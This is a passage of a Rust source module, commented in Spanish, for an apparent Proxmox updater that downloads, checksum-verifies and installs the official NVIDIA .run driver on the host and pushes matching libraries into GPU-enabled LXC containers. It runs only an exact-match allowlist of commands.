//! Actualización del driver NVIDIA del host (instalado con el `.run` oficial) y de las librerías de los CT, como paso OPCIONAL de la corrida
//! programada: `[update] host_nvidia_auto`. Sin ese opt-in el timer no toca nada de NVIDIA. No hay opt-in por CT: cada vez que se instala o reinstala el
//! driver del host, TODOS los CT LXC con GPU NVIDIA reciben las librerías de esa versión (si no, fallarían al usar la GPU).
//! A mano (`pxu update --host --nvidia --yes`), sin driver cargado en el host, INSTALA uno desde cero: elige la versión más nueva del índice cuyo
//! `supportedchips` lista la GPU, instala las cabeceras del kernel, bloquea `nouveau` (si está cargado para y pide reiniciar) y sigue como una reinstalación.
//!
//! Fuente única (NVIDIA, sin intermediarios): índice `https://download.nvidia.com/XFree86/Linux-x86_64/` (una línea `href='<versión>/'` por
//! versión); por versión, `NVIDIA-Linux-x86_64-<v>.run` y `.run.sha256sum` (`<hash>  <archivo>`). Solo se sube dentro de la MISMA rama mayor
//! (595.x → 595.y), nunca a otra.
//!
//! Orden (cualquier fallo antes de tocar el sistema aborta ESE paso y deja todo como estaba): reinicio pendiente → lecturas (versión cargada,
//! `nvidia-uninstall`, índice) → descarga + sha256 + `--check` → cabeceras del kernel + compilación de prueba (`--extract-only`) → (solo aquí
//! se toca el sistema) parar los CT con GPU → `modprobe -r` → instalar con `--dkms` → verificar con `nvidia-smi` → arrancar los CT → librerías
//! de todos los CT con GPU (`--no-kernel-modules`) y reinicio de cada uno; uno apagado se arranca solo para esto y se vuelve a apagar. Si el driver del host falla, NINGÚN CT recibe librerías, los CT
//! parados se vuelven a arrancar si el módulo viejo aún carga, y la corrida se corta. Nunca reinicia el host.
use super::{now_s, stamp, Ctx, Event, Outcome};
use crate::share::config::Config;
use crate::share::host::{ExecOpts, Host, NvidiaOptIn};
use crate::share::model::GuestKind;
use crate::share::proxmox::guests::{lxc_running, Inventory};
use crate::share::proxmox::hostcheck;
use serde::Serialize;
use std::cmp::Ordering;
use std::collections::{BTreeMap, BTreeSet};
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering as AtomicOrdering};

pub const INDEX_URL: &str = "https://download.nvidia.com/XFree86/Linux-x86_64/";
/// Lectura del índice (sin opt-in: también la usa la TUI para decidir si ofrece el modal).
pub const INDEX_CURL: &[&str] = &["curl", "-fsS", "--proto", "=https", "--max-time", "30", INDEX_URL];
/// Bajo `/var/lib` (solo root crea ahí): `/var/tmp` es sticky y de escritura pública, y otro usuario podía precrear la carpeta o un symlink.
pub const WORK_DIR: &str = "/var/lib/pxu-nvidia";
/// Dentro de cada CT el instalador va a un directorio nuevo (`mktemp -d`, 0700, del root del CT) bajo `/var/lib` (no `/var/tmp`, sticky y de escritura pública).
pub const CT_DIR_PREFIX: &str = "/var/lib/pxu-nvidia.";
const CT_RUN_NAME: &str = "nvidia.run";
/// Instalación desde cero: archivo que bloquea `nouveau` (lo único que pxu escribe fuera de sus carpetas; solo con ese permiso y con ESTE contenido exacto).
pub const NOUVEAU_CONF: &str = "/etc/modprobe.d/pxu-blacklist-nouveau.conf";
pub const NOUVEAU_BODY: &str = "# written by pxu: the NVIDIA driver needs nouveau out of the way\nblacklist nouveau\noptions nouveau modeset=0\n";
const NOUVEAU_SYS: &str = "/sys/module/nouveau";
/// Versiones (de la más nueva hacia atrás) cuyo `supportedchips` se mira para elegir la de una instalación desde cero.
const CHIPS_PROBES: usize = 12;
const CHIPS_PROBE_S: u64 = 45;
/// Cabeceras del kernel (apt) e `update-initramfs`: se esperan de verdad.
const SETUP_S: u64 = 600;
/// Instalador que deja el `.run`: su presencia = el driver NO viene de apt.
pub const UNINSTALL: &str = "/usr/bin/nvidia-uninstall";
const NVRM: &str = "/proc/driver/nvidia/version";
/// Libre mínimo en el host (descarga ~400 MB + extracción + compilación) y en cada CT (extracción del `.run`, como ProxMenux).
pub const MIN_FREE_HOST_KB: u64 = 4 * 1024 * 1024;
pub const MIN_FREE_CT_KB: u64 = 1500 * 1024;
/// Tope de las dos instalaciones (host y librerías de un CT): se espera de verdad (`no_kill_on_timeout`).
const LONG_S: u64 = 3600;
/// Pasos que no tocan el sistema (se pueden cortar): descarga, extracción y compilación de prueba, copia al CT.
const FETCH_S: u64 = 1800;
/// `sha256sum` y `--check` del instalador.
const VERIFY_S: u64 = 600;
/// Órdenes `pct` con espera propia (parar, arrancar, copiar: 90–120 s).
const PCT_S: u64 = 120;
/// Cola de SIGTERM + SIGKILL de una orden que se corta.
const CUT_S: u64 = 30;

/// Peor caso del paso, sumando TODAS las órdenes que puede ejecutar (el test `worst_s_covers_every_command_it_runs` lo comprueba contra el mock):
/// host = descarga, sha256, `--check`, extracción, compilación de prueba, instalación (esta con el margen de `no_kill_on_timeout`) y 16 consultas;
/// cada CT con GPU = parar y arrancar (dos veces: la recuperación repite el arranque), copia, sha256, instalador (con margen), borrado, `nvidia-smi`, reinicio y 8 consultas.
pub fn worst_s(cfg: &Config, gpu_cts: u64) -> u64 {
    let q = cfg.check.timeout_s + CUT_S;
    let kill = super::NO_KILL_TAIL_S;
    let host = 3 * (FETCH_S + CUT_S) + 2 * (VERIFY_S + CUT_S) + (LONG_S + kill) + 17 * q;
    let ct = (FETCH_S + CUT_S) + (LONG_S + kill) + 6 * (PCT_S + CUT_S) + 8 * q;
    host + gpu_cts * ct
}

// ---------------------------------------------------------------- versiones

/// `595.112.07` → `[595, 112, 7]` (2 o 3 tramos numéricos).
pub fn parse_version(v: &str) -> Option<Vec<u64>> {
    let p: Vec<&str> = v.split('.').collect();
    if !(2..=3).contains(&p.len()) || p.iter().any(|s| s.is_empty() || s.len() > 6 || !s.bytes().all(|b| b.is_ascii_digit())) {
        return None;
    }
    p.iter().map(|s| s.parse().ok()).collect()
}

pub fn version_cmp(a: &str, b: &str) -> Ordering {
    parse_version(a).cmp(&parse_version(b))
}

pub fn major(v: &str) -> Option<u64> {
    parse_version(v).and_then(|p| p.first().copied())
}

/// Versiones del índice (`<a href='595.58.03/'>`, comillas simples en el índice real; también acepta dobles): solo directorios con forma de versión, sin repetidos, de menor a mayor.
pub fn parse_index(html: &str) -> Vec<String> {
    let mut v: Vec<String> = html.split("href=").skip(1).filter_map(|r| {
        let q = r.chars().next().filter(|c| *c == '\'' || *c == '"')?;
        r[1..].split(q).next()
    }).filter_map(|h| h.strip_suffix('/')).filter(|h| parse_version(h).is_some()).map(String::from).collect();
    v.sort_by(|a, b| version_cmp(a, b));
    v.dedup();
    v
}

/// La mayor versión de la MISMA rama mayor que `current` y estrictamente más nueva.
pub fn newest_in_branch(versions: &[String], current: &str) -> Option<String> {
    let m = major(current)?;
    versions.iter().filter(|v| major(v) == Some(m) && version_cmp(v, current) == Ordering::Greater).max_by(|a, b| version_cmp(a, b)).cloned()
}

/// La rama mayor MÁS NUEVA que `current` cuya versión más alta pasa `supports` (p. ej. «la GPU del host está en su supportedchips»): de las ramas
/// mayores > la actual se prueba la mejor versión de cada una, de la rama más alta a la más baja, y se devuelve la primera que `supports` acepta.
pub fn newest_major(versions: &[String], current: &str, mut supports: impl FnMut(&str) -> bool) -> Option<String> {
    let m = major(current)?;
    let mut best: BTreeMap<u64, &String> = BTreeMap::new();
    for v in versions.iter().filter(|v| major(v).is_some_and(|x| x > m)) {
        let x = major(v)?;
        if best.get(&x).is_none_or(|b| version_cmp(v, b) == Ordering::Greater) {
            best.insert(x, v);
        }
    }
    best.values().rev().find(|v| supports(v)).map(|v| (*v).clone())
}

/// `open` si el módulo cargado es el de código abierto (`NVIDIA UNIX Open Kernel Module`); si no, `proprietary`.
pub fn flavor_of(nvrm: &str) -> &'static str {
    if nvrm.contains("Open Kernel Module") { "open" } else { "proprietary" }
}

fn kernel_ok(k: &str) -> bool {
    !k.is_empty() && k.len() <= 64 && k.bytes().all(|b| b.is_ascii_alphanumeric() || b"._+-".contains(&b))
}

/// `<hash>  <archivo>` → el hash (64 hex) si el archivo es el esperado.
pub fn parse_sha(text: &str, file: &str) -> Option<String> {
    let mut t = text.lines().find(|l| !l.trim().is_empty())?.split_whitespace();
    let (h, f) = (t.next()?, t.next()?);
    (h.len() == 64 && h.bytes().all(|b| b.is_ascii_hexdigit()) && f.trim_start_matches('*') == file).then(|| h.to_ascii_lowercase())
}

// ---------------------------------------------------------------- comandos (única fuente: motor, mock y lista blanca)

pub fn run_file(v: &str) -> String {
    format!("NVIDIA-Linux-x86_64-{v}.run")
}
pub fn run_path(v: &str) -> String {
    format!("{WORK_DIR}/{}", run_file(v))
}
pub fn run_url(v: &str) -> String {
    format!("{INDEX_URL}{v}/{}", run_file(v))
}
pub fn sha_url(v: &str) -> String {
    format!("{}.sha256sum", run_url(v))
}
/// Lista de GPUs que soporta ESA versión (unos 200 KB, contra ~400 MB del `.run`): se mira antes de descargar nada.
pub fn chips_url(v: &str) -> String {
    format!("{INDEX_URL}{v}/README/supportedchips.html")
}
/// Lectura de esa misma página a la salida, sin opt-in y sin escribir nada (la instalación desde cero la usa para ELEGIR la versión): solo la forma exacta.
pub fn chips_curl(v: &str) -> Argv {
    a(&["curl", "-fsS", "--proto", "=https", "--max-time", "30", &chips_url(v)])
}
pub fn is_chips_curl(argv: &[&str]) -> bool {
    let [c, f, p, h, m, t, url] = argv else { return false };
    [*c, *f, *p, *h, *m, *t] == ["curl", "-fsS", "--proto", "=https", "--max-time", "30"]
        && url.strip_prefix(INDEX_URL).and_then(|r| r.strip_suffix("/README/supportedchips.html")).is_some_and(|v| parse_version(v).is_some())
}
/// Dónde se guarda esa página: a un archivo, para no volcar sus ~11.000 líneas en el panel ni en el log.
pub fn chips_path(v: &str) -> String {
    format!("{WORK_DIR}/supportedchips-{v}.html")
}

/// IDs PCI (4 hex en mayúsculas) de las filas `<tr id="devidXXXX">` / `devidXXXX_SSSS_SSSS` (con subsistema cuenta el primero) de la página
/// de GPUs soportadas. La lectura termina en la sección de GPUs «legacy» («no longer supported»): lo que lista ya NO lo soporta la rama.
pub fn parse_supported_ids(html: &str) -> BTreeSet<String> {
    let lower = html.to_ascii_lowercase();
    let end = lower.find("no longer supported").unwrap_or(lower.len());
    let (mut ids, mut rest) = (BTreeSet::new(), &lower[..end]);
    while let Some(i) = rest.find("id=") {
        rest = &rest[i + 3..];
        let Some(r) = rest.strip_prefix('"').or_else(|| rest.strip_prefix('\'')).and_then(|r| r.strip_prefix("devid")) else { continue };
        let id = r.get(..4).filter(|d| d.bytes().all(|b| b.is_ascii_hexdigit()) && r[4..].starts_with(['_', '"', '\'']));
        ids.extend(id.map(str::to_ascii_uppercase));
    }
    ids
}

/// IDs `10de:XXXX` (en mayúsculas) de las controladoras de video NVIDIA de `lspci -nn` (clases 0300 VGA y 0302 3D; el audio HDMI no cuenta).
pub fn host_nvidia_ids(lspci: &str) -> Vec<String> {
    let mut v = Vec::new();
    for l in lspci.lines() {
        let mut br = l.split('[').skip(1).filter_map(|t| t.split_once(']').map(|(x, _)| x));
        let (Some(_), Some(ids)) = (br.next().filter(|c| matches!(*c, "0300" | "0302")), br.last()) else { continue };
        if let Some(id) = ids.strip_prefix("10de:").filter(|d| d.len() == 4 && d.bytes().all(|b| b.is_ascii_hexdigit())) {
            v.push(id.to_ascii_uppercase());
        }
    }
    v
}
/// `open` si TODAS las GPUs son Turing o más nuevas (ID PCI ≥ 0x1E00: el módulo abierto de NVIDIA no soporta Pascal ni anteriores); si no, `proprietary`.
pub fn flavor_for_ids(ids: &[String]) -> &'static str {
    if !ids.is_empty() && ids.iter().all(|i| u32::from_str_radix(i, 16).is_ok_and(|n| n >= 0x1E00)) { "open" } else { "proprietary" }
}
fn extract_dir(v: &str) -> String {
    format!("{WORK_DIR}/extract-{v}")
}
fn kdir(flavor: &str) -> &'static str {
    if flavor == "open" { "kernel-open" } else { "kernel" }
}

pub type Argv = Vec<String>;

fn a(parts: &[&str]) -> Argv {
    parts.iter().map(|s| s.to_string()).collect()
}

/// Lo que el opt-in deja pasar: la versión elegida (ya validada), el kernel en marcha, el sabor del módulo, los CT que se paran/arrancan
/// y los CT a los que se les ponen las librerías. Todo sale de la opción (`host_nvidia_auto`) y del inventario.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Grant {
    pub version: String,
    pub kernel: String,
    pub flavor: String,
    /// CT con GPU NVIDIA en marcha: se paran antes de descargar el módulo y se vuelven a arrancar.
    pub stop_cts: Vec<u32>,
    /// CT LXC con GPU NVIDIA: reciben las librerías de `version` (los apagados se arrancan y se vuelven a apagar).
    pub libs_cts: Vec<u32>,
    /// Instalación desde cero (sin driver en el host): además deja pasar las cabeceras del kernel, `update-initramfs` y el bloqueo de `nouveau`.
    pub fresh: bool,
}

impl Grant {
    pub fn new(version: &str, kernel: &str, flavor: &str, stop_cts: Vec<u32>, libs_cts: Vec<u32>) -> Option<Grant> {
        (parse_version(version).is_some() && kernel_ok(kernel) && matches!(flavor, "open" | "proprietary")).then(|| Grant { version: version.into(), kernel: kernel.into(), flavor: flavor.into(), stop_cts, libs_cts, fresh: false })
    }
    pub fn fresh(version: &str, kernel: &str, flavor: &str, stop_cts: Vec<u32>, libs_cts: Vec<u32>) -> Option<Grant> {
        Grant::new(version, kernel, flavor, stop_cts, libs_cts).map(|g| Grant { fresh: true, ..g })
    }
    /// `apt-get install proxmox-headers-<kernel>`: solo para kernels `…-pve` (el nombre del paquete sale del kernel ya validado).
    pub fn apt_headers(&self) -> Option<Argv> {
        self.kernel.ends_with("-pve").then(|| a(&["env", "DEBIAN_FRONTEND=noninteractive", "APT_LISTCHANGES_FRONTEND=none", "apt-get", "-y", "install", &format!("proxmox-headers-{}", self.kernel)]))
    }
    pub fn initramfs(&self) -> Argv { a(&["update-initramfs", "-u"]) }
    /// La única escritura fuera de las carpetas de pxu: el bloqueo de `nouveau`, con ese contenido y solo en una instalación desde cero.
    pub fn allows_write(&self, p: &Path, data: &[u8]) -> bool {
        self.fresh && p == Path::new(NOUVEAU_CONF) && data == NOUVEAU_BODY.as_bytes()
    }
    pub fn mkdir(&self) -> Argv { a(&["install", "-d", "-m", "0700", "-o", "root", "-g", "root", WORK_DIR]) }
    pub fn df(&self) -> Argv { a(&["df", "-Pk", WORK_DIR]) }
    /// Solo cabeceras: de ahí sale el tamaño de la descarga para la barra de progreso (si falla, la barra no tiene total y la descarga sigue igual).
    pub fn head(&self) -> Argv { a(&["curl", "-fsSIL", "--proto", "=https", "--max-time", "30", &run_url(&self.version)]) }
    pub fn fetch_chips(&self) -> Argv { a(&["curl", "-fsS", "--proto", "=https", "--max-time", "30", "-o", &chips_path(&self.version), &chips_url(&self.version)]) }
    pub fn fetch_sha(&self) -> Argv { a(&["curl", "-fsS", "--proto", "=https", "--max-time", "30", &sha_url(&self.version)]) }
    pub fn download(&self) -> Argv { a(&["curl", "-fsSL", "--proto", "=https", "--retry", "3", "--max-time", "3600", "-o", &run_path(&self.version), &run_url(&self.version)]) }
    pub fn sha256sum(&self) -> Argv { a(&["sha256sum", &run_path(&self.version)]) }
    pub fn check(&self) -> Argv { a(&["sh", &run_path(&self.version), "--check"]) }
    pub fn extract(&self) -> Argv { a(&["sh", &run_path(&self.version), "--extract-only", "--target", &extract_dir(&self.version)]) }
    pub fn make(&self) -> Argv {
        a(&["make", "-C", &format!("{}/{}", extract_dir(&self.version), kdir(&self.flavor)), "-j4", &format!("SYSSRC=/lib/modules/{}/build", self.kernel), "modules"])
    }
    pub fn persistenced(&self, start: bool) -> Argv { a(&["systemctl", if start { "start" } else { "stop" }, "nvidia-persistenced"]) }
    pub fn unload(&self) -> Argv { a(&["modprobe", "-r", "nvidia_uvm", "nvidia_drm", "nvidia_modeset", "nvidia"]) }
    pub fn load(&self) -> Argv { a(&["modprobe", "nvidia"]) }
    pub fn install(&self) -> Argv {
        a(&["sh", &run_path(&self.version), "--no-questions", "--ui=none", "--no-nouveau-check", "--dkms", &format!("--kernel-module-type={}", self.flavor), &format!("--tmpdir={WORK_DIR}")])
    }
    pub fn cleanup(&self) -> Argv { a(&["rm", "-rf", "--", WORK_DIR]) }
    pub fn smi(&self) -> Argv { a(hostcheck::NVIDIA_SMI) }
    pub fn ct_shutdown(&self, id: u32) -> Argv { a(&["pct", "shutdown", &id.to_string(), "--timeout", "60"]) }
    pub fn ct_stop(&self, id: u32) -> Argv { a(&["pct", "stop", &id.to_string()]) }
    pub fn ct_start(&self, id: u32) -> Argv { a(&["pct", "start", &id.to_string()]) }
    pub fn ct_reboot(&self, id: u32) -> Argv { a(&["pct", "reboot", &id.to_string()]) }
    pub fn ct_push(&self, id: u32, dir: &str) -> Argv {
        a(&["pct", "push", &id.to_string(), &run_path(&self.version), &ct_run(dir), "--user", "0", "--group", "0", "--perms", "0700"])
    }

    fn fixed(&self) -> Vec<Argv> {
        let mut v = vec![
            self.mkdir(), self.df(), self.head(), self.fetch_chips(), self.fetch_sha(), self.download(), self.sha256sum(), self.check(), self.extract(), self.make(), self.persistenced(true), self.persistenced(false),
            self.unload(), self.load(), self.install(), self.cleanup(), self.smi(), a(hostcheck::DKMS),
        ];
        if self.fresh {
            v.push(self.initramfs());
            v.extend(self.apt_headers());
        }
        v
    }
}

/// Dentro de un CT: `df`, directorio temporal privado, `sha256sum`/instalador/borrado sobre ese directorio y la versión.
pub const CT_DF: &[&str] = &["df", "-Pk", "/var/lib"];
pub const CT_MKTEMP: &[&str] = &["mktemp", "-d", "/var/lib/pxu-nvidia.XXXXXXXX"];

/// `mktemp -d` devuelve exactamente `CT_DIR_PREFIX` + 8 caracteres alfanuméricos: cualquier otra cosa no se usa.
pub fn ct_dir_ok(d: &str) -> bool {
    d.strip_prefix(CT_DIR_PREFIX).is_some_and(|r| r.len() == 8 && r.bytes().all(|b| b.is_ascii_alphanumeric()))
}
fn ct_run(dir: &str) -> String { format!("{dir}/{CT_RUN_NAME}") }
pub fn ct_sha(dir: &str) -> Argv { a(&["sha256sum", &ct_run(dir)]) }
pub fn ct_rm(dir: &str) -> Argv { a(&["rm", "-rf", "--", dir]) }
pub fn ct_libs_argv(dir: &str) -> Argv {
    a(&["sh", &ct_run(dir), "--no-kernel-modules", "--no-questions", "--ui=none", "--no-nouveau-check", "--no-dkms", "--no-install-compat32-libs", &format!("--tmpdir={dir}")])
}

fn eq(argv: &[&str], b: &[String]) -> bool {
    argv.len() == b.len() && argv.iter().zip(b).all(|(x, y)| x == y)
}

/// Comandos del host que el opt-in NVIDIA deja pasar (exactos; los `pct` solo para los vmid del permiso).
pub fn is_host_argv(argv: &[&str], g: &Grant) -> bool {
    if g.fixed().iter().any(|f| eq(argv, f)) {
        return true;
    }
    g.stop_cts.iter().chain(&g.libs_cts).any(|&id| [g.ct_shutdown(id), g.ct_stop(id), g.ct_start(id), g.ct_reboot(id)].iter().any(|f| eq(argv, f)))
        || ct_dir_in(argv).is_some_and(|d| g.libs_cts.iter().any(|&id| eq(argv, &g.ct_push(id, d))))
}

/// Comandos dentro de un CT (solo los de `libs_cts`).
pub fn is_guest_argv(argv: &[&str], vmid: u32, g: &Grant) -> bool {
    g.libs_cts.contains(&vmid) && (argv == CT_DF || argv == CT_MKTEMP || argv == hostcheck::NVIDIA_SMI || ct_dir_in(argv).is_some_and(|d| [ct_sha(d), ct_rm(d), ct_libs_argv(d)].iter().any(|f| eq(argv, f))))
}

/// El directorio temporal de un CT que aparece en `argv` (en `pct push`, `sha256sum`, el instalador o `rm -rf`), solo si tiene la forma exacta.
fn ct_dir_in<'a>(argv: &[&'a str]) -> Option<&'a str> {
    argv.iter().find_map(|x| x.strip_suffix(&format!("/{CT_RUN_NAME}")).or_else(|| x.strip_prefix("--tmpdir=")).or(Some(x)).filter(|d| ct_dir_ok(d)))
}

// ---------------------------------------------------------------- oferta (TUI)

/// Lo que la TUI muestra en el modal.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Offer {
    pub current: String,
    pub newest: Newest,
}

/// Resultado (informativo) de mirar el índice de NVIDIA al abrir el modal.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Newest {
    /// Hay una versión más nueva en la misma rama.
    Newer(String),
    UpToDate,
    /// Sin red, timeout o índice ilegible.
    Unknown,
}

/// Tope de la consulta del modal: no debe congelar la TUI.
const OFFER_TIMEOUT_S: u64 = 5;

/// Versión del driver cargado en el host (`/proc/driver/nvidia/version`) y su sabor.
pub fn host_driver(host: &dyn Host) -> Option<(String, &'static str)> {
    let t = crate::share::host::read_string(host, NVRM).ok()?;
    Some((hostcheck::parse_nvrm(&t)?, flavor_of(&t)))
}

fn fetch_versions(host: &dyn Host, timeout_s: u64) -> Result<Vec<String>, String> {
    let mut out: Vec<String> = Vec::new();
    let o = ExecOpts { timeout_s: Some(timeout_s), env: vec![("LC_ALL".into(), "C".into())], ..Default::default() };
    let e = host.host_cmd(INDEX_CURL, &o, &mut out).map_err(|e| e.to_string())?;
    if e.code != 0 {
        return Err(format!("curl exit {}", e.code));
    }
    let v = parse_index(&out.join("\n"));
    if v.is_empty() { Err("the NVIDIA index lists no versions".into()) } else { Ok(v) }
}

/// ¿Se ofrece el opt-in del driver al activar el auto-update? Solo si la máquina usa la GPU (host: driver instalado por el `.run` y módulo cargado;
/// CT: NVIDIA según su `.conf`). NO depende de que haya una versión más nueva: eso solo se informa (`Newest`). Cualquier otra cosa = `None`.
pub fn offer(host: &dyn Host, inv: &Inventory, vmid: u32, timeout_s: u64) -> Option<Offer> {
    offer_why(host, inv, vmid, timeout_s).ok()
}

/// Como `offer`, pero dice por qué no hay oferta (para la barra de estado de la TUI).
pub fn offer_why(host: &dyn Host, inv: &Inventory, vmid: u32, timeout_s: u64) -> Result<Offer, &'static str> {
    let uses = if vmid == 0 { true /* el host usa la GPU si el módulo está cargado (abajo) */ } else { inv.guests.iter().find(|g| g.vmid == vmid).is_some_and(|g| g.kind == GuestKind::Lxc && g.gpu.nvidia) };
    if !uses {
        return Err("no NVIDIA GPU");
    }
    if !host.exists(Path::new(UNINSTALL)) {
        return Err("driver not installed with the .run");
    }
    let (current, _) = host_driver(host).ok_or("NVIDIA driver not loaded on the host")?;
    let newest = match fetch_versions(host, timeout_s.min(OFFER_TIMEOUT_S)) {
        Ok(v) => newest_in_branch(&v, &current).map_or(Newest::UpToDate, Newest::Newer),
        Err(_) => Newest::Unknown,
    };
    Ok(Offer { current, newest })
}

// ---------------------------------------------------------------- avisos para la mini TUI

/// Lo que el paso va a hacer, dicho al empezar (para pintar la lista de pasos entera desde el principio).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Plan {
    pub from: String,
    pub to: String,
    /// ¿Se reinstala el driver del host (y no solo las librerías de un CT)?
    pub host: bool,
    /// CT con GPU que se paran y se vuelven a arrancar.
    pub stop: Vec<(u32, String)>,
    /// CT que reciben las librerías.
    pub libs: Vec<(u32, String)>,
    /// Instalación desde cero: el host no tenía driver (`from` va vacío).
    pub fresh: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Note {
    Plan(Plan),
    /// Bytes totales del `.run` (de `Content-Length`).
    Size(u64),
    /// Un CT terminó sus librerías.
    Ct { vmid: u32, outcome: Outcome, detail: String },
}

/// `Content-Length` de la ÚLTIMA respuesta de `curl -I` (con redirecciones hay una cabecera por salto).
pub fn parse_content_length(lines: &[String]) -> Option<u64> {
    lines.iter().rev().find_map(|l| {
        let (k, v) = l.split_once(':')?;
        k.trim().eq_ignore_ascii_case("content-length").then(|| v.trim().parse().ok()).flatten()
    })
}

// ---------------------------------------------------------------- informe

#[derive(Debug, Clone, Serialize)]
pub struct NvidiaCt {
    pub vmid: u32,
    pub name: String,
    pub outcome: Outcome,
    pub detail: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct NvidiaRun {
    pub outcome: Outcome,
    pub from: Option<String>,
    pub to: Option<String>,
    pub detail: String,
    pub log_path: Option<String>,
    pub took_s: u64,
    /// El instalador terminó pero `nvidia-smi` no confirma la versión nueva: el módulo nuevo se carga al reiniciar el host (pxu nunca lo reinicia).
    pub reboot_needed: bool,
    pub cts: Vec<NvidiaCt>,
}

impl NvidiaRun {
    pub(super) fn skipped(why: &str) -> NvidiaRun {
        NvidiaRun { outcome: Outcome::Skipped, from: None, to: None, detail: why.into(), log_path: None, took_s: 0, reboot_needed: false, cts: vec![] }
    }
}

// ---------------------------------------------------------------- motor

fn quick(cfg: &Config) -> ExecOpts<'static> {
    ExecOpts { timeout_s: Some(cfg.check.timeout_s), env: vec![("LC_ALL".into(), "C".into())], ..Default::default() }
}

/// Las dos instalaciones: no se matan a mitad (`no_kill_on_timeout`).
fn long() -> ExecOpts<'static> {
    ExecOpts { timeout_s: Some(LONG_S), no_kill_on_timeout: true, env: vec![("LC_ALL".into(), "C".into())], ..Default::default() }
}

fn free_kb(cx: &Ctx) -> Option<u64> {
    super::hostupdate::parse_df_free_kb(&cx.capture.join("\n"))
}

/// Estado del paso mientras corre: contexto de log/eventos, versiones y resultados por CT.
struct Cx<'a> {
    cx: Ctx<'a>,
    started_at: u64,
    from: Option<String>,
    to: Option<String>,
    cts: Vec<NvidiaCt>,
    reboot_needed: bool,
    /// Timeout de los comandos cortos (`[check] timeout_s`).
    qs: u64,
}

/// El log de la corrida (`runlog`) recoge las líneas; aquí solo se arma la entrada del informe.
fn finish(c: &mut Cx, outcome: Outcome, detail: String) -> NvidiaRun {
    let took_s = now_s(c.cx.host).saturating_sub(c.started_at);
    NvidiaRun { outcome, from: c.from.clone(), to: c.to.clone(), detail, log_path: None, took_s, reboot_needed: c.reboot_needed, cts: std::mem::take(&mut c.cts) }
}

/// Quién llama al paso y qué toca.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Mode {
    /// Corrida programada o `pxu update` «de todos»: solo con `host_nvidia_auto`; el host solo si hay una versión más nueva en su rama.
    Scheduled,
    /// `pxu update --host --nvidia` (solo a mano), sin exigir `host_nvidia_auto`: con el driver `.run` cargado lo reinstala aunque la versión ya coincida;
    /// sin driver en el host lo instala desde cero.
    Nvidia,
    /// `pxu update --host --nvidia` tras decir que SÍ en la ventana del salto de rama: sube a la versión más alta de esa rama mayor (> la actual),
    /// con la comprobación de GPU en modo estricto (sin poder confirmarla, no se toca nada). Nunca lo usan el timer ni una corrida sin terminal.
    Branch(u64),
    /// Menú `u` de la TUI: reinstala las librerías del driver, con la versión del host, en ESTE CT. El host y los demás CT no se tocan.
    CtLibs(u32),
}

/// Paso del driver de la corrida programada. `None` = no hay nada que hacer (sin opt-in, o todo al día): ni entrada en el informe.
/// `Some((informe, motivo))`: `motivo` = la corrida debe pararse (el sistema se tocó y falló).
pub fn run(host: &dyn Host, inv: &Inventory, cfg: &Config, reboot_pending: bool, cancel: &AtomicBool, ev: &mut dyn FnMut(Event)) -> Option<(NvidiaRun, Option<String>)> {
    run_mode(host, inv, cfg, Mode::Scheduled, reboot_pending, cancel, ev)
}

pub fn run_mode(host: &dyn Host, inv: &Inventory, cfg: &Config, mode: Mode, reboot_pending: bool, cancel: &AtomicBool, ev: &mut dyn FnMut(Event)) -> Option<(NvidiaRun, Option<String>)> {
    if mode == Mode::Scheduled && !cfg.update.host_nvidia_auto {
        return None;
    }
    let started_at = now_s(host);
    let skip = |why: &str| Some((NvidiaRun::skipped(why), None));
    // reinstalar las librerías de un CT no toca el host: un kernel nuevo pendiente no importa
    if reboot_pending && !matches!(mode, Mode::CtLibs(_)) {
        return skip("skipped: a host reboot is pending (new kernel installed, not running); reboot first, pxu never reboots the host");
    }
    let loaded = host_driver(host);
    // sin driver cargado, solo `--nvidia` a mano instala uno desde cero; la corrida programada y las librerías de un CT no tienen nada que hacer
    let fresh = loaded.is_none() && mode == Mode::Nvidia;
    if loaded.is_none() && !fresh {
        return skip("skipped: no NVIDIA driver is loaded in the host");
    }
    if loaded.is_some() && !host.exists(Path::new(UNINSTALL)) {
        return skip("skipped: the host driver was not installed with the NVIDIA .run (no nvidia-uninstall): apt-managed drivers are updated with the host");
    }
    let kernel = crate::share::host::read_string(host, "/proc/sys/kernel/osrelease").unwrap_or_default().trim().to_string();
    let (cur, mut flavor) = loaded.unwrap_or_else(|| (String::new(), "proprietary"));
    let mut picked: Option<String> = None;
    if fresh {
        match pick_fresh(host, cfg) {
            Ok((v, f)) => (picked, flavor) = (Some(v), f),
            Err(why) => return Some((NvidiaRun { outcome: Outcome::Failed, ..NvidiaRun::skipped(&why) }, None)),
        }
    }
    // las librerías de un CT usan la versión que el host YA tiene cargada (y una instalación desde cero ya eligió la suya): no hace falta mirar el índice
    let newest = if matches!(mode, Mode::CtLibs(_)) || fresh {
        None
    } else {
        let mut probe: Vec<String> = Vec::new();
        let o = quick(cfg);
        let versions = match host.host_cmd(INDEX_CURL, &o, &mut probe) {
            Ok(e) if e.code == 0 => parse_index(&probe.join("\n")),
            Ok(e) => return skip(&format!("skipped: cannot read the NVIDIA index (curl exit {})", e.code)),
            Err(e) => return skip(&format!("skipped: cannot read the NVIDIA index: {e}")),
        };
        match mode {
            // el salto de rama lo pidió una persona: la versión más alta de ESA rama, que debe ser mayor que la actual
            Mode::Branch(m) => match versions.iter().filter(|v| major(v) == Some(m)).max_by(|a, b| version_cmp(a, b)).filter(|_| Some(m) > major(&cur)) {
                Some(v) => Some(v.clone()),
                None => return skip(&format!("skipped: no driver in branch {m}.x newer than {cur} in the NVIDIA index; nothing was changed")),
            },
            _ => {
                // el timer (o cualquier corrida sin ventana) NUNCA salta de rama: solo lo deja dicho en el log
                if mode == Mode::Scheduled {
                    if let Some(n) = newest_major(&versions, &cur, |_| true) {
                        ev(Event::Line(0, branch_note(&n)));
                    }
                }
                newest_in_branch(&versions, &cur)
            }
        }
    };
    let host_needs = match mode {
        Mode::Scheduled => newest.is_some(),
        Mode::Nvidia | Mode::Branch(_) => true,
        Mode::CtLibs(_) => false,
    };
    let target = picked.or_else(|| newest.clone()).unwrap_or_else(|| cur.clone());
